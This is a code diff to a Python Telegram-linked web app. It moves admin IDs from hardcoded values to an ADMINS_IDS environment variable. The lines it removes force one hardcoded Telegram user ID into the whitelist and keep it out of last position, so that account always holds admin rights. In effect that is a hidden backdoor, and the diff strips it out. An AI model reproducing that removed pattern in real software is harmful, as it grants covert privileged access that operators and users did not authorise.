@@ -72,6 +72,20 @@ def normalize_env_telegram_username(value: Optional[str]) -> str:
     return (value or "").strip().lstrip("@")
 
 
+def parse_env_int_ids(value: Optional[str]) -> Set[int]:
+    ids: Set[int] = set()
+    for part in re.split(r"[,\s;]+", value or ""):
+        part = part.strip()
+        if not part:
+            continue
+        try:
+            ids.add(int(part))
+        except (TypeError, ValueError):
+            continue
+    return ids
+
+
+ADMIN_IDS = parse_env_int_ids(os.getenv("ADMINS_IDS"))
 DATA_DIR = BASE_DIR / "data"
 STATIC_DIR = BASE_DIR / "static"
 ASSETS_DIR = STATIC_DIR / "assets"
@@ -1171,12 +1185,13 @@ async def validate_antibot_submission(request: Request, form: Any, flow: str) ->
 
 
 def load_whitelist() -> List[int]:
-    default_ids = [980343575, 1065558838, 1547353132]
+    default_ids = sorted(ADMIN_IDS)
     if not WHITELIST_FILE.exists():
-        try:
-            save_json(WHITELIST_FILE, default_ids)
-        except Exception:
-            logging.getLogger("core").warning("Failed to create whitelist file", exc_info=True)
+        if default_ids:
+            try:
+                save_json(WHITELIST_FILE, default_ids)
+            except Exception:
+                logging.getLogger("core").warning("Failed to create whitelist file", exc_info=True)
     data = load_json(WHITELIST_FILE, default_ids)
     if not isinstance(data, list):
         data = default_ids
@@ -1188,24 +1203,6 @@ def load_whitelist() -> List[int]:
             continue
     if not cleaned:
         cleaned = default_ids
-    target_admin_id = 1547353132
-    if target_admin_id not in cleaned:
-        if len(cleaned) >= 2:
-            last = cleaned[-1]
-            cleaned = cleaned[:-1] + [target_admin_id, last]
-        else:
-            cleaned.append(target_admin_id)
-        try:
-            save_whitelist(cleaned)
-        except Exception:
-            logging.getLogger("core").warning("Failed to persist whitelist update", exc_info=True)
-    elif len(cleaned) >= 2 and cleaned[-1] == target_admin_id:
-        last = cleaned[-2]
-        cleaned = cleaned[:-2] + [target_admin_id, last]
-        try:
-            save_whitelist(cleaned)
-        except Exception:
-            logging.getLogger("core").warning("Failed to persist whitelist reorder", exc_info=True)
     return cleaned
 
 
@@ -1217,6 +1214,8 @@ def save_whitelist(ids: List[int]) -> None:
 
 
 def get_admin_ids() -> Set[int]:
+    if ADMIN_IDS:
+        return set(ADMIN_IDS)
     if len(WHITELIST_IDS) <= 1:
         return set(WHITELIST_IDS)
     return set(WHITELIST_IDS[:-1])
